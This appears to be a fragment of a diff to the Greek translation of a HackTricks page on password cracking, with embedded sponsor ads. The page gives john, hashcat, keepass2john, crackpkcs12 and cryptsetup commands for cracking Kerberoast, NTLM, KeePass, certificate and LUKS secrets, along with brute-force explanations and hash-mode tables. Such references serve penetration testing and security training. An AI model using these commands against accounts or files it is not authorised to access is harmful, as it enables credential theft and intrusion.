-Για να σπάσετε έναν κωδικό ιδιοκτήτη PDF, ελέγξτε αυτό: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+Για να σπάσετε έναν κωδικό ιδιοκτήτη PDF ελέγξτε αυτό: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -627,7 +585,7 @@ keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a f
 #The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
-### Keberoasting
+### Χτυπώντας το Keberoasting
 ```bash
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
@@ -653,7 +611,7 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-Άλλο ένα οδηγός Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
+Άλλος οδηγός Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
 
 ### Mysql
 ```bash
@@ -668,7 +626,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 ```
 ### Cisco
 
-<figure><img src="../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>
 
 ### DPAPI Master Key
 
@@ -695,13 +653,13 @@ zip -r file.xls .
 # From https://github.com/crackpkcs12/crackpkcs12
 crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 ```
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της παγκόσμιας κοινότητας.\
+Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της παγκόσμιας κοινότητας.\
 Αποκτήστε πρόσβαση σήμερα:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
 ## Εργαλεία
 
@@ -721,7 +679,7 @@ hash-identifier
 
 ### **Εργαλεία Δημιουργίας Λιστών Λέξεων**
 
-* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Γεννήτρια περιπάτου πληκτρολογίου με προηγμένες ρυθμίσεις βασικών χαρακτήρων, χαρτογράφηση πλήκτρων και διαδρομές.
+* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Γεννήτρια περιπάτου πληκτρολογίου με προηγμένες δυνατότητες, που μπορεί να ρυθμιστεί με βάση τους χαρακτήρες βάσης, τον χάρτη πλήκτρων και τις διαδρομές.
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
@@ -738,7 +696,7 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 * **Επίθεση με λίστα λέξεων** (`-a 0`) με κανόνες
 
-**Το Hashcat** έρχεται ήδη με ένα **φάκελο που περιέχει κανόνες** αλλά μπορείτε να βρείτε [**άλλους ενδιαφέροντες κανόνες εδώ**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Το Hashcat** έρχεται ήδη με έναν **φάκελο που περιέχει κανόνες** αλλά μπορείτε να βρείτε [**άλλους ενδιαφέροντες κανόνες εδώ**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
@@ -788,7 +746,7 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
 ## Use it to crack the password
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 ```
-* Λίστα λέξεων + Μάσκα (`-a 6`) / Μάσκα + Λίστα λέξεων (`-a 7`) επίθεση
+* Επίθεση με λίστα λέξεων + Μάσκα (`-a 6`) / Μάσκα + Λίστα Λέξεων (`-a 7`)
 ```bash
 # Mask numbers will be appended to each word in the wordlist
 hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
@@ -802,40 +760,21 @@ hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
 ## Brute Forcing
 
-Brute forcing is a common technique used to crack passwords by systematically attempting all possible combinations of characters until the correct one is found. In the context of cracking Linux hashes from the `/etc/shadow` file, brute forcing involves generating potential passwords and hashing them using the same algorithm as the target system. These hashes are then compared with the target hash to find a match. This method can be resource-intensive and time-consuming, especially for complex passwords.
+Brute forcing is a common technique used to crack passwords by systematically trying all possible combinations of characters until the correct one is found. In the context of cracking Linux hashes stored in the `/etc/shadow` file, brute forcing involves generating potential passwords and hashing them using the same algorithm as the one used to create the stored hash. The generated hash is then compared with the target hash from the `/etc/shadow` file. If they match, the password has been successfully cracked.
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
-## Brute Forcing Windows Hashes
+## Brute Force
 
-### Introduction
-
-Brute forcing Windows hashes involves using automated tools to try all possible combinations of characters to crack the password hash. This is a common technique used by hackers to gain unauthorized access to Windows systems.
-
-### Methodology
-
-1. **Capture Hash**: Obtain the password hash from the Windows system.
-2. **Wordlist Attack**: Use a wordlist containing commonly used passwords to try and crack the hash.
-3. **Brute Force Attack**: If the wordlist attack fails, use a brute force attack to systematically try all possible combinations of characters until the correct password is found.
-4. **Rainbow Tables**: In some cases, rainbow tables can be used to crack Windows hashes more quickly than traditional brute force methods.
-
-### Tools
-
-- **Hashcat**: A popular password cracking tool that supports various hash algorithms.
-- **John the Ripper**: Another powerful password cracking tool that can be used for Windows hashes.
-- **CrackStation**: An online database of pre-computed hashes that can be used for hash cracking.
-
-### Conclusion
-
-Brute forcing Windows hashes can be a time-consuming process, especially if the password is complex. It is important for system administrators to use strong, unique passwords to prevent unauthorized access to Windows systems.
+Brute force attacks are a common way to crack Windows hashes. This method involves trying all possible combinations of characters until the correct password is found. Brute force attacks can be time-consuming but are often effective, especially if the password is weak. There are tools available that can automate the brute force process, such as John the Ripper and Hashcat. It is important to note that using brute force attacks against a system without permission is illegal and unethical.
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-## Αποκωδικοποίηση Συνηθισμένων Κατακερματισμένων Εφαρμογών
+Αποκωδικοποίηση Συνηθισμένων Κατακερματισμένων Εφαρμογών
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -851,18 +790,18 @@ Brute forcing Windows hashes can be a time-consuming process, especially if the 
 
 Άλλοι τρόποι υποστήριξης του HackTricks:
 
-* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.
 
 </details>
 
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
+Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
 Αποκτήστε πρόσβαση σήμερα:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
